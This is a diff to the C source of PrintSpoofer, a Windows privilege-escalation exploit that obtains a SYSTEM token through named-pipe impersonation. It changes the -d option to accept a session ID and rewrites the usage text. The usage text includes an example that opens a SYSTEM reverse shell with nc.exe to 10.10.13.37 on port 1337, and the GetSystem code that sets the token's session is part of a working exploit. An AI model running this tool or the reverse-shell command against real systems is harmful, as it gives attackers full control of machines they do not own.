@@ -13,7 +13,7 @@
 #pragma warning( disable : 28251 )
 
 BOOL g_bInteractWithConsole = FALSE;
-BOOL g_bInteractWithDesktop = FALSE;
+DWORD g_dwSessionId = 0;
 LPWSTR g_pwszCommandLine = NULL;
 
 int wmain(int argc, wchar_t** argv)
@@ -29,7 +29,24 @@ int wmain(int argc, wchar_t** argv)
 			g_bInteractWithConsole = TRUE;
 			break;
 		case 'd':
-			g_bInteractWithDesktop = TRUE;
+			++argv;
+			--argc;
+			if (argc > 1 && argv[1][0] != '-')
+			{
+				g_dwSessionId = wcstoul(argv[1], NULL, 0);
+				if (!g_dwSessionId)
+				{
+					wprintf(L"[-] Invalid session id: %ws\n", argv[1]);
+					PrintUsage();
+					return -1;
+				}
+			}
+			else
+			{
+				wprintf(L"[-] Missing value for option: -d\n");
+				PrintUsage();
+				return -1;
+			}
 			break;
 		case 'c':
 			++argv;
@@ -55,17 +72,15 @@ int wmain(int argc, wchar_t** argv)
 		--argc;
 	}
 
-	if (g_bInteractWithConsole && g_bInteractWithDesktop)
+	if (g_bInteractWithConsole && g_dwSessionId)
 	{
 		wprintf(L"[-] More than one interaction mode was specified.\n");
-		PrintUsage();
 		return -1;
 	}
 
 	if (!g_pwszCommandLine)
 	{
-		wprintf(L"[-] Missing command line argument.\n");
-		PrintUsage();
+		wprintf(L"[-] Please specify a command to execute\n");
 		return -1;
 	}
 
@@ -85,9 +100,9 @@ VOID PrintUsage()
 	);
 	wprintf(
 		L"Arguments:\n"
-		"  -c <CMD>    Custom command line to execute\n"
-		"  -i          Interact with the new process in the current console (default is non-interactive)\n"
-		"  -d          Spawn a new process on the currently active desktop\n"
+		"  -c <CMD>    Execute the command *CMD*\n"
+		"  -i          Interact with the new process in the current command prompt (default is non-interactive)\n"
+		"  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)\n"
 		"  -h          That's me :)\n"
 		"\n"	
 	);
@@ -96,8 +111,8 @@ VOID PrintUsage()
 		L"Examples:\n"
 		"  - Run PowerShell as SYSTEM in the current console\n"
 		"      PrintSpoofer.exe -i -c powershell.exe\n"
-		"  - Spawn a SYSTEM command prompt on the currently active desktop\n"
-		"      PrintSpoofer.exe -d -c cmd.exe\n"
+		"  - Spawn a SYSTEM command prompt on the desktop of the session 1\n"
+		"      PrintSpoofer.exe -d 1 -c cmd.exe\n"
 		"  - Get a SYSTEM reverse shell\n"
 		"      PrintSpoofer.exe -c \"c:\\Temp\\nc.exe 10.10.13.37 1337 -e cmd\"\n"
 		"\n"
@@ -461,11 +476,12 @@ BOOL GetSystem(HANDLE hPipe)
 		goto cleanup;
 	}
 
-	if (g_bInteractWithDesktop)
+	//if (g_bInteractWithDesktop)
+	if (g_dwSessionId)
 	{
-		DWORD dwSessionId = WTSGetActiveConsoleSessionId();
+		//DWORD dwSessionId = WTSGetActiveConsoleSessionId();
 
-		if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &dwSessionId, sizeof(DWORD)))
+		if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
 		{
 			wprintf(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
 			goto cleanup;
